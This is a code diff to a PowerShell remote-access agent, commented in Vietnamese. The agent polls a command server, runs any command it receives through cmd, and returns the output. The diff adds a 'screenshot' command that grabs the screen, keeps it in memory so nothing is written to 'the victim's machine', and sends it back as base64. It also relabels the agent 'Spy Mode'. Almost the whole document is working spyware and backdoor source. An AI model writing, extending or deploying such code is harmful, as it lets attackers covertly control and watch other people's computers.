@@ -3,6 +3,10 @@ $server_url = "http://127.0.0.1:8080"
 $agent_id = $null
 $sleep_time = 3
 
+# Nạp các thư viện .NET cần thiết để xử lý đồ họa và chụp ảnh
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
 # --- HÀM CHỨC NĂNG ---
 
 function Register-Agent {
@@ -30,9 +34,43 @@ function Send-Result ($output_str) {
     } catch {}
 }
 
+# Hàm thực hiện chụp màn hình
+function Capture-Screen {
+    try {
+        # Lấy kích thước màn hình chính
+        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        
+        # Tạo đối tượng bitmap với kích thước tương ứng
+        $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+        
+        # Sao chép hình ảnh từ màn hình vào bitmap
+        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+        
+        # Lưu hình ảnh vào luồng bộ nhớ (MemoryStream) thay vì ghi ra file đĩa
+        # Điều này giúp tránh việc tạo file rác trên máy nạn nhân (OpSec)
+        $ms = New-Object System.IO.MemoryStream
+        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+        
+        # Chuyển đổi dữ liệu ảnh sang chuỗi Base64
+        $base64_img = [Convert]::ToBase64String($ms.ToArray())
+        
+        # Dọn dẹp tài nguyên bộ nhớ
+        $graphics.Dispose()
+        $bmp.Dispose()
+        $ms.Dispose()
+        
+        # Trả về chuỗi định dạng đặc biệt để Server nhận diện
+        return "[IMAGE] $base64_img"
+    }
+    catch {
+        return "Error capturing screen: $_"
+    }
+}
+
 # --- MAIN LOOP ---
 
-Write-Host "[*] Starting Agent (Obfuscated Mode)..."
+Write-Host "[*] Starting Agent (Spy Mode)..."
 $agent_id = Register-Agent
 
 if (-not $agent_id) { Write-Host "[-] Failed."; Exit }
@@ -50,8 +88,16 @@ while ($true) {
             
             Write-Host "[*] Executing: $cmd"
             
-            # Thực thi lệnh thực tế
-            $result = cmd /c $cmd 2>&1 | Out-String
+            # Phân loại lệnh để xử lý
+            if ($cmd -eq "screenshot") {
+                # Gọi hàm chụp màn hình
+                $result = Capture-Screen
+            }
+            else {
+                # Nếu không phải lệnh đặc biệt, chạy như lệnh CMD thông thường
+                $result = cmd /c $cmd 2>&1 | Out-String
+            }
+
         } catch {
             $result = "Error: $_"
         }
